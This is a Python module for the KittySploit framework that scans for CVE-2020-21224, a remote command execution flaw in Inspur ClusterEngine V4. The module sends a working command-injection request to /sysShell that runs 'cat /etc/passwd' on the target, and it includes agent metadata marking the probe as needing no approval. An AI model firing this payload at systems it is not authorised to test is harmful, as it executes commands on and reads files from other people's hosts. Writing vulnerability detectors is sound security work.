#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Inspur Clusterengine V4 SYSshell was found and allows remote command execution by design."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Inspur Clusterengine V4 SYSshell - Remote Command Execution Detection',
        'description': 'Inspur Clusterengine V4 SYSshell was found and allows remote command execution by design.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'inspur', 'clusterengine', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.inspursystems.com/',
            'https://github.com/MzzdToT/ClusterEngineV4.0sysShell_rce',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-21224',
            'https://github.com/NS-Sp4ce/Inspur/tree/master/ClusterEngineV4.0%20Vul',
        ],
        'cve': 'CVE-2020-21224',
    }

    def run(self):
        path = '/sysShell'
        r = self.http_request(method='POST', path=path, allow_redirects=True, headers={'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'Cookie': 'lang=cn'}, data='op=doPlease&node=cu01&command=cat+/etc/passwd\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='Inspur Clusterengine V4 SYSshell - Remote Command Execution detected', path=path)
            return True
        return False

